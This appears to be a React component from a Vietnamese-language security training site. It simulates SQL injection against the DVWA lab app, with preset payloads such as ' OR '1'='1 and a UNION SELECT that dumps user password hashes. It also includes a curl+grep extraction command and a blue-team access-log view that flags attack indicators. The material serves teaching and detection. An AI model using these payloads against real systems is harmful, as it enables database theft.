"use client";

import { useState } from "react";
import { Bug, Database, FileSearch, Play, RotateCcw, Send } from "lucide-react";
import { WindowControls } from "@/components/WindowBar";

interface Props {
  containerRef: string;
  phpsessid: string;
  activeTab?: string;
}

interface AccessLogItem {
  id: string;
  ip: string;
  timestamp: string;
  method: string;
  uri: string;
  status: string;
  bytes: string;
  ua: string;
  iocNote: string;
  isNew?: boolean;
}

const INITIAL_LOG_LINES: AccessLogItem[] = [
  {
    id: "seed-1",
    ip: "172.17.0.1",
    timestamp: "04/Nov/2026:02:14:08 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1%27&Submit=Submit",
    status: "200",
    bytes: "1842",
    ua: "Mozilla/5.0 (Burp Chromium)",
    iocNote: "Ký tự %27 (nháy đơn) phá vỡ câu lệnh, kích hoạt lỗi cú pháp MariaDB",
  },
  {
    id: "seed-2",
    ip: "172.17.0.1",
    timestamp: "04/Nov/2026:02:15:21 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit",
    status: "200",
    bytes: "2195",
    ua: "curl/8.5.0",
    iocNote: "User-Agent là curl + Payload OR '1'='1 trả về dung lượng lớn (2195B)",
  },
  {
    id: "seed-3",
    ip: "172.17.0.1",
    timestamp: "04/Nov/2026:02:16:03 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,password%20FROM%20users&Submit=Submit",
    status: "200",
    bytes: "2340",
    ua: "sqlmap/1.8.4#stable",
    iocNote: "Từ khóa UNION SELECT + User-Agent lộ rõ công cụ tự động sqlmap",
  },
];

export function Member2Simulator({ containerRef, phpsessid, activeTab }: Props) {
  const [tab, setTab] = useState<"burp" | "logs">(
    activeTab === "m2-curl-log" ? "logs" : "burp"
  );
  const [payload, setPayload] = useState("1'");
  const [sentPayload, setSentPayload] = useState("1'");
  const [isSending, setIsSending] = useState(false);

  const [curlId, setCurlId] = useState("1");
  const [regexFilter, setRegexFilter] = useState("First name: [^<]*");
  const [showRawHtml, setShowRawHtml] = useState(false);
  const [curlExecuted, setCurlExecuted] = useState(true);

  const [logSearch, setLogSearch] = useState("");
  const [liveLogs, setLiveLogs] = useState<AccessLogItem[]>(INITIAL_LOG_LINES);
  const [newLogCount, setNewLogCount] = useState(0);

  const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";
  const container = containerRef.trim() || "dvwa";

  const encodedPayload = encodeURIComponent(sentPayload);
  const isUnion = /union\s+select/i.test(sentPayload);
  const isOrTrue = /'\s*or\s*'1'='1|or\s+1=1/i.test(sentPayload);
  const hasSyntaxError = sentPayload.includes("'") && !isOrTrue && !isUnion;

  const formatNowTimestamp = () => {
    const d = new Date();
    const pad = (n: number) => String(n).padStart(2, "0");
    return `${pad(d.getDate())}/Nov/2026:${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} +0700`;
  };

  const describePayloadIoc = (p: string) => {
    if (/union\s+select/i.test(p)) {
      return "Từ khóa UNION SELECT nối bảng users — nghi vấn trích xuất dữ liệu hàng loạt";
    }
    if (/'\s*or\s*'1'='1|or\s+1=1/i.test(p)) {
      return "Biểu thức logic luôn đúng (OR '1'='1) làm rò rỉ toàn bộ bản ghi users";
    }
    if (p.includes("'")) {
      return "Chứa ký tự nháy đơn %27 làm gãy chuỗi SQL, kích hoạt Error-based SQLi";
    }
    return "Truy vấn thông thường hợp lệ (không chứa ký tự điều khiển SQL)";
  };

  const recordLogEntry = (targetPayload: string, ua: string) => {
    const unionMatch = /union\s+select/i.test(targetPayload);
    const orMatch = /'\s*or\s*'1'='1|or\s+1=1/i.test(targetPayload);
    const errMatch = targetPayload.includes("'") && !unionMatch && !orMatch;
    const bytes = unionMatch ? "2340" : orMatch ? "2195" : errMatch ? "1842" : "1690";

    const newItem: AccessLogItem = {
      id: `live-${Date.now()}-${Math.random()}`,
      ip: "127.0.0.1",
      timestamp: formatNowTimestamp(),
      method: "GET",
      uri: `/vulnerabilities/sqli/?id=${encodeURIComponent(targetPayload)}&Submit=Submit`,
      status: "200",
      bytes,
      ua,
      iocNote: describePayloadIoc(targetPayload),
      isNew: true,
    };

    setLiveLogs((prev) => [newItem, ...prev].slice(0, 12));
    setNewLogCount((c) => c + 1);
  };

  const handleSendBurp = (overridePayload?: string) => {
    const p = overridePayload ?? payload;
    setIsSending(true);
    setSentPayload(p);
    setTimeout(() => {
      setIsSending(false);
      recordLogEntry(p, "Mozilla/5.0 (Burp Chromium)");
    }, 300);
  };

  const handleRunCurl = () => {
    setCurlExecuted(true);
    recordLogEntry(curlId, "curl/8.5.0");
  };

  const getBackendAnalysis = () => {
    if (isUnion) {
      return {
        statusText: "LỖI TRUY VẤN GHÉP BẢNG (UNION-BASED SQLi)",
        statusClass: "text-amber-300",
        detail:
          "Vế SELECT thứ hai ghép thêm kết quả đọc cột user và password từ bảng users vào chung kết quả hiển thị.",
      };
    }
    if (isOrTrue) {
      return {
        statusText: "ĐIỀU KIỆN WHERE LUÔN ĐÚNG (TAUTOLOGY)",
        statusClass: "text-amber-300",
        detail:
          "Mệnh đề điều kiện biến thành user_id = '' OR '1'='1' (luôn TRUE với mọi dòng) nên MariaDB trả ra toàn bộ 5 tài khoản.",
      };
    }
    if (hasSyntaxError) {
      return {
        statusText: "GÃY CẤU TRÚC CHUỖI SQL (ERROR-BASED SQLi)",
        statusClass: "text-rose-300",
        detail:
          "Dấu nháy đơn chưa đóng cặp khiến bộ phân tích cú pháp MariaDB dừng khẩn cấp và hàm die(mysqli_error()) in lỗi ra giao diện.",
      };
    }
    return {
      statusText: "TRUY VẤN ĐƠN HỢP LỆ",
      statusClass: "text-emerald-300",
      detail:
        "Tham số chỉ chứa giá trị ID bình thường, không làm thay đổi cây cú pháp câu lệnh SELECT.",
    };
  };

  const getCurlFilteredOutput = () => {
    const rawHtmlSnippet = `<div class="vulnerable_code_area">
  <form action="#" method="GET">
    <p>User ID: <input type="text" size="15" name="id"></p>
  </form>
  <pre>ID: ${curlId}<br />First name: admin<br />Surname: admin</pre>
</div>`;

    let matches: string[] = [];
    try {
      const re = new RegExp(regexFilter, "g");
      matches = rawHtmlSnippet.match(re) ?? [];
    } catch {
      matches = ["[Lỗi cú pháp Regex]"];
    }

    return { rawHtmlSnippet, matches };
  };

  const filteredLogs = liveLogs.filter(
    (l) =>
      !logSearch ||
      l.uri.toLowerCase().includes(logSearch.toLowerCase()) ||
      l.iocNote.toLowerCase().includes(logSearch.toLowerCase()) ||
      l.ua.toLowerCase().includes(logSearch.toLowerCase())
  );

  const backendInfo = getBackendAnalysis();
  const curlResult = getCurlFilteredOutput();

  return (
    <div className="rounded-lg border border-hairline bg-surface p-4 sm:p-5">
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3 border-b border-hairline pb-3">
        <div>
          <h3 className="flex items-center gap-2 text-sm font-bold text-ink sm:text-base">
            <Bug className="h-4 w-4 text-accent" aria-hidden="true" />
            Interactive Console — Hùng (Laptop Ubuntu VM 1 · Burp Suite &amp; Log Forensics)
          </h3>
          <p className="font-mono text-xs text-muted">
            Proxy Listener: 127.0.0.1:8081 · Target Host: http://localtest.me:8080 (Loopback Bypass)
          </p>
        </div>

        <div className="inline-flex rounded-md border border-hairline bg-subtle p-0.5 text-xs">
          <button
            type="button"
            onClick={() => setTab("burp")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "burp"
                ? "bg-surface font-semibold text-ink shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            1. Burp Repeater &amp; SQL Analyzer
          </button>
          <button
            type="button"
            onClick={() => {
              setTab("logs");
              setNewLogCount(0);
            }}
            className={`inline-flex cursor-pointer items-center gap-1.5 rounded px-3 py-1 font-medium transition-colors ${
              tab === "logs"
                ? "bg-surface font-semibold text-ink shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            <span>2. cURL + grep &amp; access.log</span>
            {newLogCount > 0 && (
              <span className="rounded bg-accent px-1.5 py-0.5 font-mono text-[10px] font-bold text-white">
                +{newLogCount}
              </span>
            )}
          </button>
        </div>
      </div>

      {tab === "burp" ? (
        <div className="space-y-4">
          {/* Payload Selector Bar */}
          <div className="flex flex-wrap items-center gap-2 rounded-md border border-hairline bg-subtle p-3">
            <span className="text-xs font-semibold text-ink">Payload mẫu:</span>
            {[
              { label: "id = 1 (Chuẩn)", val: "1" },
              { label: "id = 1' (Lỗi cú pháp)", val: "1'" },
              { label: "id = ' OR '1'='1 (Dump 5 users)", val: "' OR '1'='1" },
              {
                label: "id = 1' UNION SELECT...",
                val: "1' UNION SELECT user, password FROM users -- -",
              },
            ].map((p) => (
              <button
                key={p.val}
                type="button"
                onClick={() => {
                  setPayload(p.val);
                  handleSendBurp(p.val);
                }}
                className={`cursor-pointer rounded border px-2.5 py-1 font-mono text-xs transition-colors ${
                  payload === p.val
                    ? "border-ink bg-ink font-semibold text-canvas"
                    : "border-hairline bg-surface text-secondary hover:text-ink"
                }`}
              >
                {p.label}
              </button>
            ))}

            <div className="ml-auto flex w-full items-center gap-2 sm:w-auto">
              <input
                type="text"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter") handleSendBurp();
                }}
                aria-label="Payload id"
                className="w-full rounded-md border border-hairline bg-surface px-2.5 py-1 font-mono text-xs text-ink focus:border-accent focus:outline-none sm:w-48"
                placeholder="Nhập tùy ý id..."
              />
              <button
                type="button"
                onClick={() => handleSendBurp()}
                disabled={isSending}
                className="inline-flex shrink-0 cursor-pointer items-center gap-1.5 rounded-md bg-accent px-3 py-1.5 text-xs font-semibold text-white hover:opacity-90 disabled:opacity-50"
              >
                <Send className="h-3.5 w-3.5" aria-hidden="true" />
                {isSending ? "Sending..." : "Send"}
              </button>
            </div>
          </div>

          {/* Side-by-side Request and Response */}
          <div className="grid gap-3 lg:grid-cols-2">
            {/* Request Pane */}
            <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs">
              <div className="mb-2 flex items-center justify-between border-b border-zinc-800 pb-2">
                <div className="flex items-center gap-2.5">
                  <WindowControls />
                  <span className="font-bold text-zinc-200">
                    RAW HTTP REQUEST (Burp Repeater)
                  </span>
                </div>
                <span className="text-[11px] text-zinc-400">localtest.me:8080</span>
              </div>
              <pre className="overflow-x-auto leading-relaxed text-zinc-200">
{`GET /vulnerabilities/sqli/?id=${encodedPayload}&Submit=Submit HTTP/1.1
Host: localtest.me:8080
User-Agent: Mozilla/5.0 (Burp Suite Chromium; Linux x86_64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Cookie: security=low; PHPSESSID=${session}
Connection: close`}
              </pre>
            </div>

            {/* Response Pane */}
            <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs">
              <div className="mb-2 flex items-center justify-between border-b border-zinc-800 pb-2">
                <div className="flex items-center gap-2.5">
                  <WindowControls />
                  <span className="font-bold text-zinc-200">
                    HTTP RESPONSE (18ms · 200 OK)
                  </span>
                </div>
                <span
                  className={`rounded px-1.5 py-0.5 text-[10px] font-bold ${
                    isOrTrue || isUnion
                      ? "bg-amber-500/20 text-amber-300"
                      : hasSyntaxError
                      ? "bg-rose-500/20 text-rose-300"
                      : "bg-emerald-500/20 text-emerald-300"
                  }`}
                >
                  {isUnion
                    ? "UNION SELECT LEAK"
                    : isOrTrue
                    ? "DUMPED ALL 5 USERS"
                    : hasSyntaxError
                    ? "MARIADB ERROR (CWE-89)"
                    : "NORMAL RESPONSE"}
                </span>
              </div>

              {isSending ? (
                <div className="py-8 text-center text-amber-400">
                  Đang chờ phản hồi từ 127.0.0.1:8080...
                </div>
              ) : isUnion ? (
                <pre className="overflow-x-auto leading-relaxed text-amber-200">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ${sentPayload}
First name: admin    | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb  | Surname: e99a18c428cb38d5f260853678922e03
First name: 1337     | Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: smithy   | Surname: 5f4dcc3b5aa765d61d8327deb882cf99`}
                </pre>
              ) : isOrTrue ? (
                <pre className="overflow-x-auto leading-relaxed text-amber-200">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ${sentPayload}
First name: admin    | Surname: admin
First name: Gordon   | Surname: Brown
First name: Hack     | Surname: Me
First name: Pablo    | Surname: Picasso
First name: Bob      | Surname: Smith`}
                </pre>
              ) : hasSyntaxError ? (
                <pre className="overflow-x-auto leading-relaxed text-rose-300">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

<pre>You have an error in your SQL syntax; check the manual
that corresponds to your MariaDB server version for the right
syntax to use near '''${sentPayload}''' at line 1</pre>`}
                </pre>
              ) : (
                <pre className="overflow-x-auto leading-relaxed text-emerald-300">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ${sentPayload}
First name: admin
Surname: admin`}
                </pre>
              )}
            </div>
          </div>

          {/* Live Backend SQL Query Analyzer */}
          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs">
            <div className="mb-2 flex flex-wrap items-center justify-between gap-2 border-b border-zinc-800 pb-2">
              <div className="flex items-center gap-2.5">
                <WindowControls />
                <Database className="h-3.5 w-3.5 text-zinc-400" aria-hidden="true" />
                <span className="font-bold text-zinc-200">
                  PHÂN TÍCH CÂU LỆNH SQL TẠI BACKEND (low.php dòng 8)
                </span>
              </div>
              <span className={`text-[11px] font-bold ${backendInfo.statusClass}`}>
                {backendInfo.statusText}
              </span>
            </div>

            <div className="overflow-x-auto rounded border border-zinc-800 bg-[#05070a] px-3 py-2 text-zinc-300">
              <span className="text-zinc-500">
                SELECT first_name, last_name FROM users WHERE user_id = &apos;
              </span>
              <span className={`font-bold ${backendInfo.statusClass}`}>{sentPayload}</span>
              <span className="text-zinc-500">&apos;;</span>
            </div>
            <p className="mt-2 font-sans text-xs text-zinc-400">
              {backendInfo.detail} Gói tin vừa gửi đã được ghi nhận vào{" "}
              <button
                type="button"
                onClick={() => {
                  setTab("logs");
                  setNewLogCount(0);
                }}
                className="cursor-pointer font-semibold text-accent underline underline-offset-2"
              >
                access.log ở Tab 2
              </button>
              .
            </p>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          {/* cURL + grep section */}
          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2 border-b border-zinc-800/80 pb-2">
              <div className="flex items-center gap-2.5">
                <WindowControls />
                <span className="text-xs font-semibold text-zinc-200">
                  PoC 2 (Phần 2): Tự động bóc tách dữ liệu bằng cURL + grep regex
                </span>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setShowRawHtml((v) => !v)}
                  className="cursor-pointer rounded border border-zinc-700 bg-zinc-800 px-2.5 py-1 text-[11px] text-zinc-300 hover:bg-zinc-700"
                >
                  {showRawHtml ? "Ẩn HTML gốc" : "Đối chiếu HTML gốc"}
                </button>
                <button
                  type="button"
                  onClick={handleRunCurl}
                  className="inline-flex cursor-pointer items-center gap-1 rounded bg-emerald-600 px-3 py-1 text-xs font-semibold text-white hover:bg-emerald-500"
                >
                  <Play className="h-3 w-3" aria-hidden="true" /> Chạy cURL + grep
                </button>
              </div>
            </div>

            <div className="mb-2 flex flex-wrap items-center gap-3 font-mono text-xs">
              <div className="flex items-center gap-1.5">
                <span className="text-zinc-400">id=</span>
                <input
                  type="text"
                  value={curlId}
                  onChange={(e) => setCurlId(e.target.value)}
                  aria-label="Tham số id cho cURL"
                  className="w-24 rounded border border-zinc-700 bg-zinc-900 px-2 py-0.5 text-zinc-200 focus:outline-none"
                />
              </div>
              <div className="flex items-center gap-1.5">
                <span className="text-zinc-400">Regex filter (-o):</span>
                <input
                  type="text"
                  value={regexFilter}
                  onChange={(e) => setRegexFilter(e.target.value)}
                  aria-label="Biểu thức chính quy grep"
                  className="w-48 rounded border border-zinc-700 bg-zinc-900 px-2 py-0.5 text-zinc-200 focus:outline-none"
                />
              </div>
            </div>

            <pre className="overflow-x-auto font-mono text-xs text-zinc-300">
{`hung@ubuntu-vm:~$ curl -s -b "security=low; PHPSESSID=${session}" \\
  "http://127.0.0.1:8080/vulnerabilities/sqli/?id=${encodeURIComponent(curlId)}&Submit=Submit" | grep -o "${regexFilter}"`}
            </pre>

            {showRawHtml && (
              <pre className="mt-2 overflow-x-auto rounded border border-zinc-800 bg-[#05070a] p-2.5 font-mono text-[11px] text-zinc-400">
                {curlResult.rawHtmlSnippet}
              </pre>
            )}

            {curlExecuted && (
              <div className="mt-2 rounded border border-emerald-500/40 bg-emerald-950/30 px-3 py-2 font-mono text-xs text-emerald-300">
                {curlResult.matches.length > 0
                  ? curlResult.matches.join("\n")
                  : "(Không có dòng nào khớp với biểu thức regex hiện tại)"}
              </div>
            )}
          </div>

          {/* access.log Forensics section */}
          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2 border-b border-zinc-800/80 pb-2">
              <div className="flex items-center gap-2.5">
                <WindowControls
                  onClose={() => setLiveLogs(INITIAL_LOG_LINES)}
                  closeTitle="Khôi phục access.log mẫu"
                />
                <FileSearch className="h-3.5 w-3.5 text-accent" aria-hidden="true" />
                <span className="text-xs font-semibold text-zinc-200">
                  Blue Team Log Forensics (/var/log/apache2/access.log · {container})
                </span>
              </div>
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  placeholder="Lọc ký tự (%27, UNION, curl)..."
                  value={logSearch}
                  onChange={(e) => setLogSearch(e.target.value)}
                  className="rounded border border-zinc-700 bg-zinc-900 px-2 py-1 font-mono text-xs text-zinc-200 focus:outline-none"
                />
                {logSearch && (
                  <button
                    type="button"
                    onClick={() => setLogSearch("")}
                    className="inline-flex cursor-pointer items-center gap-1 rounded bg-zinc-800 px-2.5 py-1 text-xs text-zinc-300 hover:bg-zinc-700"
                  >
                    Xóa lọc
                  </button>
                )}
                {liveLogs.length > INITIAL_LOG_LINES.length && (
                  <button
                    type="button"
                    onClick={() => setLiveLogs(INITIAL_LOG_LINES)}
                    title="Khôi phục về 3 dòng log chuẩn"
                    className="inline-flex cursor-pointer items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-2 py-1 text-xs text-zinc-300 hover:bg-zinc-700"
                  >
                    <RotateCcw className="h-3 w-3" aria-hidden="true" /> Reset log
                  </button>
                )}
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left font-mono text-[11px] text-zinc-300">
                <thead>
                  <tr className="border-b border-zinc-800 text-zinc-400">
                    <th className="pb-1.5 pr-2">IP NGUỒN</th>
                    <th className="pb-1.5 pr-2">URI &amp; PAYLOAD</th>
                    <th className="pb-1.5 pr-2">BYTES</th>
                    <th className="pb-1.5 pr-2">USER-AGENT</th>
                    <th className="pb-1.5">DẤU HIỆU TẤN CÔNG (IoC)</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-zinc-800/60">
                  {filteredLogs.map((log) => (
                    <tr
                      key={log.id}
                      className={`hover:bg-zinc-800/30 ${
                        log.isNew ? "bg-blue-950/20" : ""
                      }`}
                    >
                      <td className="py-2 pr-2 text-zinc-400 whitespace-nowrap">
                        {log.ip}
                        {log.isNew && (
                          <span className="ml-1.5 rounded bg-accent px-1 py-0.5 text-[9px] font-bold text-white">
                            MỚI
                          </span>
                        )}
                      </td>
                      <td className="py-2 pr-2 font-semibold text-amber-300">{log.uri}</td>
                      <td className="py-2 pr-2 text-emerald-400">{log.bytes}B</td>
                      <td className="py-2 pr-2 text-zinc-400">{log.ua}</td>
                      <td className="py-2 font-sans text-rose-300">{log.iocNote}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
